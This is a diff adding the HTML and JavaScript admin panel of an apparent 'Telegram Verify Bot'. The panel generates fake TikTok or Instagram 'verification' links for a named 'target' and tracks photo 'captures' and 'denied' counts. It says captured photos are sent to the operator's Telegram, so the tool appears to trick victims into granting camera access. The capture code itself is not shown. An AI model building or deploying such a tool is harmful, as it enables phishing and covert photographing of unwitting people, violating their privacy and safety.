@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Telegram Verify Bot — Admin</title>
+    <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="bot-badge">🤖</div>
+            <h1>🔗 Telegram Verify Bot</h1>
+            <p class="subtitle">Generate verification links sent via your Telegram bot</p>
+
+            <div class="stats-bar" id="statsBar">
+                <span>📎 <strong id="statLinks">0</strong> links</span>
+                <span>📸 <strong id="statPhotos">0</strong> captures</span>
+                <span>🚫 <strong id="statDenied">0</strong> denied</span>
+            </div>
+
+            <div class="form-group">
+                <label for="platformSelect">Choose Platform:</label>
+                <select id="platformSelect">
+                    <option value="tiktok">♫ TikTok</option>
+                    <option value="instagram">📷 Instagram</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label for="customName">Custom Name (optional):</label>
+                <input type="text" id="customName" placeholder="e.g., target_user_001" />
+            </div>
+
+            <button id="generateBtn" class="btn-primary">Generate Link</button>
+
+            <div id="generatedLinkContainer" class="hidden">
+                <h3>✅ Link Generated!</h3>
+                <p class="success-note">Photo will be sent to your Telegram automatically</p>
+                <div class="link-box">
+                    <input type="text" id="generatedLink" readonly />
+                    <button id="copyBtn" class="btn-small">Copy</button>
+                </div>
+                <a href="dashboard.html" class="btn-secondary" target="_blank">📸 View All Captures</a>
+            </div>
+
+            <div id="errorContainer" class="hidden" style="margin-top:16px;padding:12px;background:rgba(245,87,108,0.15);border-radius:8px;border:1px solid rgba(245,87,108,0.3);color:#f5576c;">
+                <p id="errorText"></p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ============================================================
+        // ADMIN PANEL — FIXED VERSION
+        // ============================================================
+
+        const API_BASE = window.location.origin;
+
+        // Load stats on page load
+        async function loadStats() {
+            try {
+                const res = await fetch(API_BASE + '/api/stats');
+                if (!res.ok) throw new Error('HTTP ' + res.status);
+                const data = await res.json();
+                document.getElementById('statLinks').textContent = data.totalLinks || 0;
+                document.getElementById('statPhotos').textContent = data.totalPhotos || 0;
+                document.getElementById('statDenied').textContent = data.totalDenied || 0;
+            } catch (err) {
+                console.log('Stats load error (non-fatal):', err.message);
+            }
+        }
+        loadStats();
+
+        // Elements
+        const generateBtn = document.getElementById('generateBtn');
+        const platformSelect = document.getElementById('platformSelect');
+        const customNameInput = document.getElementById('customName');
+        const linkContainer = document.getElementById('generatedLinkContainer');
+        const linkInput = document.getElementById('generatedLink');
+        const copyBtn = document.getElementById('copyBtn');
+        const errorContainer = document.getElementById('errorContainer');
+        const errorText = document.getElementById('errorText');
+
+        function showError(msg) {
+            errorText.textContent = msg;
+            errorContainer.classList.remove('hidden');
+        }
+
+        function hideError() {
+            errorContainer.classList.add('hidden');
+        }
+
+        // Generate link
+        generateBtn.addEventListener('click', async () => {
+            const platform = platformSelect.value;
+            const name = customNameInput.value.trim();
+
+            // Disable button
+            generateBtn.textContent = '⏳ Generating...';
+            generateBtn.disabled = true;
+            hideError();
+            linkContainer.classList.add('hidden');
+
+            try {
+                console.log('Sending request:', { platform, name });
+                
+                const res = await fetch(API_BASE + '/api/generate-link', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ platform, name: name || undefined })
+                });
+
+                const data = await res.json();
+
+                if (!res.ok) {
+                    throw new Error(data.error || 'HTTP ' + res.status);
+                }
+
+                console.log('Link generated:', data);
+                linkInput.value = data.verifyUrl;
+                linkContainer.classList.remove('hidden');
+                loadStats();
+
+            } catch (err) {
+                console.error('Generation error:', err);
+                showError('❌ Error: ' + err.message + '. Check that the server is running.');
+            }
+
+            // Re-enable button
+            generateBtn.textContent = 'Generate Link';
+            generateBtn.disabled = false;
+        });
+
+        // Copy link
+        copyBtn.addEventListener('click', () => {
+            linkInput.select();
+            navigator.clipboard.writeText(linkInput.value)
+                .then(() => {
+                    copyBtn.textContent = 'Copied!';
+                    setTimeout(() => { copyBtn.textContent = 'Copy'; }, 2000);
+                })
+                .catch(() => {
+                    document.execCommand('copy');
+                    copyBtn.textContent = 'Copied!';
+                    setTimeout(() => { copyBtn.textContent = 'Copy'; }, 2000);
+                });
+        });
+    </script>
+</body>
+</html>
